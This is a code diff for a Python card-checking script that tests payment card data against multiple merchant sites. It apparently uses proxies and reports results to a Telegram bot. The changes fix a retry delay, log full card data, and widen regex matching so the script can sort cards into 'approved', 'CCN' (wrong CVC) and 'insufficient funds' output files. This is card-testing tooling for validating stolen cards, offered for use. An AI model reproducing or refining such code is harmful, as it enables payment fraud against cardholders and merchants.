@@ -45,7 +45,7 @@ def fetch_nonce_and_key(api_url, headers, proxies=None, retries=3, delay=1):
                     return nonce_match.group(1), key_match.group(1)
         except Exception as e:
             logger.warning(f"Nonce/key fetch attempt {attempt+1} failed at {api_url}: {e}")
-            time.sleep(delay)
+        time.sleep(delay)
     return None, None
 
 def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, api_url, proxy=None):
@@ -111,18 +111,21 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         success = resp_json.get('success', False)
         text = confirm_resp.text
 
+        logger.info(f"Response text for card {card_data}: {text}")
+
         if success:
             with open('AUTH.txt', 'a') as f:
                 f.write(f"{card_data}\n")
             return "APPROVED", f"AUTH {card_data}", card_data
 
-        if "Your card's security code is incorrect." in text:
+        # CASE-INSENSITIVE and regex checks for varied error responses
+        if re.search(r"(security code is incorrect|incorrect cvc|incorrect security code|invalid cvc|wrong cvc)", text, re.IGNORECASE):
             message = f"Incorrect CVC {card_data}"
             with open('IncorrectCVC.txt', 'a') as f:
                 f.write(f"{card_data}\n")
             return "CCN", message, card_data
 
-        if "Your card has insufficient funds." in text:
+        if re.search(r"(insufficient funds|not enough funds|declined for insufficient funds)", text, re.IGNORECASE):
             message = f"Insufficient {card_data}"
             with open('Insuff.txt', 'a') as f:
                 f.write(f"{card_data}\n")
@@ -136,7 +139,6 @@ def process_single_card_for_site(card_data, headers, uuids, chat_id, bot_token, 
         msg = f"Setup intent error for {card_data}: {e}"
         logger.error(msg)
         return "DECLINED", msg, card_data
-
 
 def check_card_across_sites(card_data, headers, uuids, chat_id, bot_token, sites, proxy=None):
     for idx, site_url in enumerate(sites[:10], start=1):
